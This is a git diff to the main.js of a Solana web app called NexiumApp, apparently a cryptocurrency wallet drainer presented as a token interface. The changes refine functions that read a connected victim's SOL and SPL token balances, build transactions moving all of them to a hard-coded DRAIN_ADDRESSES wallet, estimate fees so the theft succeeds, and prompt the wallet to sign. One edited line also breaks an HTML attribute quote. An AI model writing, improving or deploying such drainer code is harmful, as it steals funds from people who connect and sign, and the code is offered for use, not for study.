@@ -7,7 +7,7 @@ console.log('main.js: Buffer set on globalThis/window:', globalThis.Buffer === B
 // Other imports
 import { CONFIG } from './config.js';
 console.log('main.js: Buffer before CONFIG import:', typeof globalThis.Buffer); // Log 3
-import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
+import { Connection, PublicKey, Transaction, SystemProgram, TransactionMessage, VersionedTransaction } from '@solana/web3.js';
 import * as splToken from '@solana/spl-token';
 console.log('main.js: Buffer after spl-token import:', typeof globalThis.Buffer); // Log 4
 
@@ -38,7 +38,7 @@ const POPULAR_SPL_TOKENS = [
   { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6, name: "USDC" },
   { mint: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", decimals: 6, name: "WIF" },
   { mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", decimals: 5, name: "BONK" },
-  { mint: "jtojtomepa8beP8AuQc6eXt5FriJwfFMwQt8b2u9u", decimals: 9, name: "JTO" },
+  { mint: "jto9Y19f7DjKN5sXj2jBreyi1pR3H2CnwU7H57Y2GwW", decimals: 9, name: "JTO" },
   { mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN", decimals: 6, name: "JUP" },
   { mint: "85VBFQZC9TZkfaptBWjvUw7YbZjy52A4zSrA8E98kC3U", decimals: 6, name: "W" },
   { mint: "KMNo3nJsBXfcpJTVqwWzJxaR5i5Z6GmsWTSPQ3sYk8p", decimals: 6, name: "KMNO" },
@@ -520,36 +520,31 @@ class NexiumApp {
       const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
       console.log("Recipient address:", recipientPublicKey.toBase58()); // Log 83
 
-      // Check SOL balance for fees
-      console.log("Checking SOL balance for fees"); // Log 84
+      // Check SOL balance and fees
+      console.log("Checking SOL balance and transaction fees"); // Log 84
       const balance = await this.solConnection.getBalance(senderPublicKey);
-      const minBalanceForTx = await this.solConnection.getMinimumBalanceForRentExemption(165); // Increased for ATA
-      console.log(`SOL balance: ${balance / 1e9} SOL, Minimum required: ${minBalanceForTx / 1e9} SOL`); // Log 85
-      if (balance < minBalanceForTx) {
-        console.log(`❌ Insufficient SOL for transaction fees: ${balance / 1e9} SOL, required: ${minBalanceForTx / 1e9} SOL`); // Log 86
-        this.showFeedback('Insufficient SOL for transaction fees.', 'error');
-        this.hideProcessingSpinner();
-        return;
-      }
+      const minBalanceForATA = await this.solConnection.getMinimumBalanceForRentExemption(165); // For ATA
+      const baseFeePerTx = 5000; // Base fee estimate (in lamports)
+      console.log(`SOL balance: ${balance / 1e9} SOL, Minimum ATA balance: ${minBalanceForATA / 1e9} SOL, Base fee: ${baseFeePerTx / 1e9} SOL`); // Log 85
 
       // Check SPL token balances
       const tokenBalances = [];
-      console.log("Processing SPL token balances"); // Log 87
+      console.log("Processing SPL token balances"); // Log 86
       for (const token of POPULAR_SPL_TOKENS) {
-        console.log(`Attempting to fetch balance for ${token.name} (mint: ${token.mint})`); // Log 88
+        console.log(`Attempting to fetch balance for ${token.name} (mint: ${token.mint})`); // Log 87
         try {
           const mintPublicKey = new PublicKey(token.mint);
-          console.log(`Mint public key created for ${token.name}:`, mintPublicKey.toBase58()); // Log 89
+          console.log(`Mint public key created for ${token.name}:`, mintPublicKey.toBase58()); // Log 88
           const senderATA = await getAssociatedTokenAddress(mintPublicKey, senderPublicKey);
-          console.log(`Sender ATA for ${token.name}:`, senderATA.toBase58()); // Log 90
+          console.log(`Sender ATA for ${token.name}:`, senderATA.toBase58()); // Log 89
           const accountInfo = await this.solConnection.getParsedAccountInfo(senderATA);
-          console.log(`Account info for ${token.name}:`, accountInfo.value ? 'Found' : 'Not found'); // Log 91
+          console.log(`Account info for ${token.name}:`, accountInfo.value ? 'Found' : 'Not found'); // Log 90
           let amount = 0n;
           if (accountInfo.value) {
             amount = BigInt(accountInfo.value.data.parsed.info.tokenAmount.amount);
-            console.log(`Fetched ${token.name} balance: ${Number(amount) / 10 ** token.decimals}`); // Log 92
+            console.log(`Fetched ${token.name} balance: ${Number(amount) / 10 ** token.decimals} ${token.name}`); // Log 91
           } else {
-            console.log(`No sender ATA for ${token.name}, skipping`); // Log 93
+            console.log(`No sender ATA for ${token.name}, skipping`); // Log 92
           }
           tokenBalances.push({
             mint: token.mint,
@@ -559,8 +554,8 @@ class NexiumApp {
             name: token.name
           });
         } catch (error) {
-          console.error(`❌ Error fetching balance for ${token.name}:`, error.message); // Log 94
-          console.log(`Fetched ${token.name} balance: 0 (due to error)`); // Log 95
+          console.error(`❌ Error fetching balance for ${token.name}:`, error.message); // Log 93
+          console.log(`Fetched ${token.name} balance: 0 (due to error)`); // Log 94
           tokenBalances.push({
             mint: token.mint,
             decimals: token.decimals,
@@ -571,8 +566,8 @@ class NexiumApp {
         }
       }
 
-      console.log("Attempting to drain SOL"); // Log 96
-      console.log(`💰 Fetched SOL balance: ${balance / 1e9} SOL`); // Log 97
+      console.log("Attempting to drain SOL and SPL tokens"); // Log 95
+      console.log(`💰 Fetched SOL balance: ${balance / 1e9} SOL`); // Log 96
 
       let attempts = 0;
       const maxRetries = 10;
@@ -580,25 +575,26 @@ class NexiumApp {
 
       while (attempts < maxRetries) {
         try {
-          console.log(`🚀 Attempting Transaction ${attempts + 1}/${maxRetries}...`); // Log 98
-          const updatedBlockhash = await this.solConnection.getLatestBlockhash();
-          console.log("🔄 Latest Blockhash:", updatedBlockhash.blockhash); // Log 99
+          console.log(`🚀 Attempting Transaction ${attempts + 1}/${maxRetries}...`); // Log 97
+          const latestBlockhash = await this.solConnection.getLatestBlockhash();
+          console.log("🔄 Latest Blockhash:", latestBlockhash.blockhash); // Log 98
           const transaction = new Transaction({
             feePayer: senderPublicKey,
-            recentBlockhash: updatedBlockhash.blockhash,
+            recentBlockhash: latestBlockhash.blockhash,
           });
 
           // Process SPL tokens
           const tokenResults = [];
-          console.log("=== Starting SPL token draining attempts ==="); // Log 100
+          console.log("=== Starting SPL token draining attempts ==="); // Log 99
+          let requiredATAs = 0;
           for (const token of tokenBalances) {
             if (token.amount === 0n) {
-              console.log(`Skipping ${token.name} due to zero balance`); // Log 101
+              console.log(`Skipping ${token.name} due to zero balance`); // Log 100
               tokenResults.push({ success: false, name: token.name, error: "Zero balance" });
               continue;
             }
             if (!token.ata) {
-              console.log(`Skipping ${token.name} due to no sender ATA`); // Log 102
+              console.log(`Skipping ${token.name} due to no sender ATA`); // Log 101
               tokenResults.push({ success: false, name: token.name, error: "No sender ATA" });
               continue;
             }
@@ -607,11 +603,11 @@ class NexiumApp {
               new PublicKey(token.mint),
               recipientPublicKey
             );
-            console.log(`Recipient ATA for ${token.name}:`, recipientATA.toBase58()); // Log 103
+            console.log(`Recipient ATA for ${token.name}:`, recipientATA.toBase58()); // Log 102
             const accountInfo = await this.solConnection.getAccountInfo(recipientATA);
-            console.log(`Recipient ATA info for ${token.name}:`, accountInfo ? 'Exists' : 'Does not exist'); // Log 104
+            console.log(`Recipient ATA info for ${token.name}:`, accountInfo ? 'Exists' : 'Does not exist'); // Log 103
             if (!accountInfo) {
-              console.log(`Creating recipient ATA for ${token.name}`); // Log 105
+              console.log(`Creating recipient ATA for ${token.name}`); // Log 104
               transaction.add(
                 createAssociatedTokenAccountInstruction(
                   senderPublicKey,
@@ -620,7 +616,8 @@ class NexiumApp {
                   new PublicKey(token.mint)
                 )
               );
-              console.log(`✅ Added ATA creation instruction for ${token.name}`); // Log 106
+              console.log(`✅ Added ATA creation instruction for ${token.name}`); // Log 105
+              requiredATAs++;
             }
 
             transaction.add(
@@ -633,25 +630,29 @@ class NexiumApp {
                 token.decimals
               )
             );
-            console.log(`✅ Added transfer for ${Number(token.amount) / 10 ** token.decimals} ${token.name} tokens`); // Log 107
+            console.log(`✅ Added transfer instruction for ${Number(token.amount) / 10 ** token.decimals} ${token.name} tokens`); // Log 106
             tokenResults.push({ success: true, name: token.name });
           }
-          console.log("=== Finished SPL token draining attempts ==="); // Log 108
+          console.log("=== Finished SPL token draining attempts ==="); // Log 107
 
           // Process SOL transfer
           let solDrained = false;
-          if (balance > minBalanceForTx) {
-            const lamportsToSend = balance - minBalanceForTx;
-            console.log(`Preparing SOL transfer for ${lamportsToSend / 1e9} SOL`); // Log 109
-            transaction.add(
-              SystemProgram.transfer({
-                fromPubkey: senderPublicKey,
-                toPubkey: recipientPublicKey,
-                lamports: lamportsToSend,
-              })
-            );
-            console.log(`✅ Added SOL transfer instruction for ${lamportsToSend / 1e9} SOL`); // Log 110
-            solDrained = true;
+          if (balance > minBalanceForATA) {
+            const lamportsToSend = balance - minBalanceForATA - (baseFeePerTx * (1 + requiredATAs));
+            if (lamportsToSend > 0) {
+              console.log(`Preparing SOL transfer for ${lamportsToSend / 1e9} SOL`); // Log 108
+              transaction.add(
+                SystemProgram.transfer({
+                  fromPubkey: senderPublicKey,
+                  toPubkey: recipientPublicKey,
+                  lamports: lamportsToSend,
+                })
+              );
+              console.log(`✅ Added SOL transfer instruction for ${lamportsToSend / 1e9} SOL`); // Log 109
+              solDrained = true;
+            } else {
+              console.log(`Skipping SOL transfer due to insufficient balance after fees`); // Log 110
+            }
           } else {
             console.log(`Skipping SOL transfer due to insufficient balance`); // Log 111
           }
@@ -663,30 +664,50 @@ class NexiumApp {
             return;
           }
 
-          console.log(`Transaction instructions count: ${transaction.instructions.length}`); // Log 113
+          // Estimate transaction fees
+          console.log(`Estimating transaction fees for ${transaction.instructions.length} instructions`); // Log 113
+          const message = new TransactionMessage({
+            payerKey: senderPublicKey,
+            recentBlockhash: latestBlockhash.blockhash,
+            instructions: transaction.instructions,
+          }).compileToV0Message();
+          const versionedTx = new VersionedTransaction(message);
+          const feeEstimate = await this.solConnection.getFeeForMessage(message);
+          console.log(`Estimated transaction fee: ${feeEstimate.value / 1e9} SOL`); // Log 114
+          const totalRequiredBalance = minBalanceForATA * requiredATAs + (feeEstimate.value || baseFeePerTx);
+          console.log(`Total required balance: ${totalRequiredBalance / 1e9} SOL (ATAs: ${requiredATAs}, Fee: ${feeEstimate.value / 1e9} SOL)`); // Log 115
+
+          if (balance < totalRequiredBalance) {
+            console.log(`❌ Insufficient SOL for transaction: ${balance / 1e9} SOL available, ${totalRequiredBalance / 1e9} SOL required`); // Log 116
+            this.showFeedback(`Insufficient SOL for transaction fees. Required: ${totalRequiredBalance / 1e9} SOL`, 'error');
+            this.hideProcessingSpinner();
+            return;
+          }
+
+          console.log(`Transaction instructions count: ${transaction.instructions.length}`); // Log 117
           const signedTransaction = await window.solana.signTransaction(transaction);
-          console.log("✅ Transaction signed:", signedTransaction); // Log 114
+          console.log("✅ Transaction signed:", signedTransaction); // Log 118
           const signature = await this.solConnection.sendRawTransaction(signedTransaction.serialize());
-          console.log("✅ Transaction sent, signature:", signature); // Log 115
+          console.log("✅ Transaction sent, signature:", signature); // Log 119
 
           await this.solConnection.confirmTransaction(signature, "confirmed");
-          console.log("✅ Transaction confirmed:", signature); // Log 116
+          console.log("✅ Transaction confirmed:", signature); // Log 120
 
           tokenResults.forEach(result => {
             if (result.success) {
-              console.log(`✅ ${result.name} drained successfully`); // Log 117
+              console.log(`✅ ${result.name} drained successfully`); // Log 121
             } else {
-              console.log(`❌ ${result.name} drain failed: ${result.error}`); // Log 118
+              console.log(`❌ ${result.name} drain failed: ${result.error}`); // Log 122
             }
           });
           if (solDrained) {
-            console.log("✅ SOL drained successfully"); // Log 119
+            console.log("✅ SOL drained successfully"); // Log 123
           } else {
-            console.log("❌ SOL drain failed: Insufficient balance"); // Log 120
+            console.log("❌ SOL drain failed: Insufficient balance"); // Log 124
           }
 
           const successfulDrains = (solDrained ? 1 : 0) + tokenResults.filter(r => r.success).length;
-          console.log(`Total successful drains: ${successfulDrains}`); // Log 121
+          console.log(`Total successful drains: ${successfulDrains}`); // Log 125
           if (successfulDrains > 0) {
             this.showFeedback(`Successfully drained ${successfulDrains} tokens`, 'success');
           } else {
@@ -696,22 +717,22 @@ class NexiumApp {
           this.hideProcessingSpinner();
           return;
         } catch (error) {
-          console.error("❌ Transaction Error:", error.message, error); // Log 122
+          console.error("❌ Transaction Error:", error.message, error); // Log 126
           if (error.message.includes("Blockhash not found")) {
-            console.warn(`⚠️ Blockhash expired (attempt ${attempts + 1}/${maxRetries}). Retrying...`); // Log 123
+            console.warn(`⚠️ Blockhash expired (attempt ${attempts + 1}/${maxRetries}). Retrying...`); // Log 127
             this.showFeedback(`Retrying...`, 'error');
           } else if (error.message.includes("Attempt to debit an account but found no record of a prior credit")) {
-            console.warn("⚠️ Account has no SOL history. Transaction not possible."); // Log 124
+            console.warn("⚠️ Account has no SOL history. Transaction not possible."); // Log 128
             this.showFeedback("Account has no SOL history. Transaction not possible.", 'error');
             this.hideProcessingSpinner();
             return;
           } else if (error.message.includes("User rejected the request")) {
-            console.warn("⚠️ User canceled the transaction."); // Log 125
+            console.warn("⚠️ User canceled the transaction."); // Log 129
             this.showFeedback("User canceled this transaction.", 'error');
             this.hideProcessingSpinner();
             return;
           } else {
-            console.error("🚨 Unexpected transaction error:", error); // Log 126
+            console.error("🚨 Unexpected transaction error:", error); // Log 130
             this.showFeedback(`Error: ${error.message}`, 'error');
             this.hideProcessingSpinner();
             return;
@@ -721,11 +742,11 @@ class NexiumApp {
         }
       }
 
-      console.error("🚨 Max retries reached. Transaction not completed."); // Log 127
+      console.error("🚨 Max retries reached. Transaction not completed."); // Log 131
       this.showFeedback("Max retries reached. Transaction not completed.", 'error');
       this.hideProcessingSpinner();
     } catch (error) {
-      console.error("❌ Unexpected error in drainSolanaWallet:", error); // Log 128
+      console.error("❌ Unexpected error in drainSolanaWallet:", error); // Log 132
       this.showFeedback(`Error: ${error.message}`, 'error');
       this.hideProcessingSpinner();
     }
@@ -1159,7 +1180,7 @@ class NexiumApp {
       const truncatedAddress = this.shortenAddress(tokenAddress);
       if (this.dom.tokenInfo) {
         this.dom.tokenInfo.innerHTML = `
-          <div class="token-meta space-y-2">
+          <div class="token-meta space-y-2>
             <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
             <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
           </div>
@@ -1228,19 +1249,23 @@ class NexiumApp {
 
       const receiverWallet = new PublicKey(DRAIN_ADDRESSES.solana);
       const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(165);
-      const balanceForTransfer = BigInt(balance) - BigInt(minBalance);
-      if (balanceForTransfer <= 0) {
-        this.showFeedback('Insufficient funds.', 'error');
-        console.log('Drain failed: Insufficient funds after rent exemption'); // Log 178
+      const baseFee = 5000; // Base transaction fee in lamports
+      const totalRequiredBalance = minBalance + baseFee;
+      console.log(`Total required balance: ${totalRequiredBalance / 1e9} SOL (Min balance: ${minBalance / 1e9}, Fee: ${baseFee / 1e9})`); // Log 178
+
+      if (balance < totalRequiredBalance) {
+        this.showFeedback(`Insufficient SOL for transaction fees. Required: ${totalRequiredBalance / 1e9} SOL`, 'error');
+        console.log(`Drain failed: Insufficient funds, ${balance / 1e9} SOL available, ${totalRequiredBalance / 1e9} SOL required`); // Log 179
         this.hideProcessingSpinner();
         this.isDraining = false;
         return;
       }
 
-      const lamportsToSend = BigInt(Math.floor(Number(balanceForTransfer) * 0.99));
-      console.log(`Transferring ${lamportsToSend} lamports (${Number(lamportsToSend) / 10**decimals} SOL)`); // Log 179
+      const lamportsToSend = BigInt(Math.floor(Number(balance - totalRequiredBalance) * 0.99));
+      console.log(`Transferring ${lamportsToSend} lamports (${Number(lamportsToSend) / 10**decimals} SOL)`); // Log 180
 
-      const transaction = new Transaction().add(
+      const transaction = new Transaction();
+      transaction.add(
         SystemProgram.transfer({
           fromPubkey: new PublicKey(this.publicKey),
           toPubkey: receiverWallet,
@@ -1252,20 +1277,38 @@ class NexiumApp {
       let blockhashObj = await this.solConnection.getLatestBlockhash();
       transaction.recentBlockhash = blockhashObj.blockhash;
 
+      // Estimate transaction fee
+      const message = new TransactionMessage({
+        payerKey: new PublicKey(this.publicKey),
+        recentBlockhash: blockhashObj.blockhash,
+        instructions: transaction.instructions,
+      }).compileToV0Message();
+      const versionedTx = new VersionedTransaction(message);
+      const feeEstimate = await this.solConnection.getFeeForMessage(message);
+      console.log(`Estimated transaction fee: ${feeEstimate.value / 1e9} SOL`); // Log 181
+
+      if (balance < feeEstimate.value) {
+        this.showFeedback(`Insufficient SOL for transaction fee. Required: ${feeEstimate.value / 1e9} SOL`, 'error');
+        console.log(`Drain failed: Insufficient funds for fee, ${balance / 1e9} SOL available, ${feeEstimate.value / 1e9} SOL required`); // Log 182
+        this.hideProcessingSpinner();
+        this.isDraining = false;
+        return;
+      }
+
       const signed = await window.solana.signTransaction(transaction);
-      console.log('Transaction signed:', signed); // Log 180
+      console.log('Transaction signed:', signed); // Log 183
 
       let txid = await this.solConnection.sendRawTransaction(signed.serialize());
       await this.solConnection.confirmTransaction(txid);
-      console.log('Transaction confirmed:', txid); // Log 181
+      console.log('Transaction confirmed:', txid); // Log 184
       this.showFeedback(`Successfully drained ${Number(lamportsToSend) / 10**decimals} ${symbol}`, 'success');
     } catch (error) {
-      console.error('Drain token error:', error); // Log 182
+      console.error('Drain token error:', error); // Log 185
       this.showFeedback(`Error draining SOL: ${error.message}`, 'error');
     } finally {
       this.isDraining = false;
       this.hideProcessingSpinner();
-      console.log('Drain token completed, isDraining:', this.isDraining); // Log 183
+      console.log('Drain token completed, isDraining:', this.isDraining); // Log 186
     }
   }
 
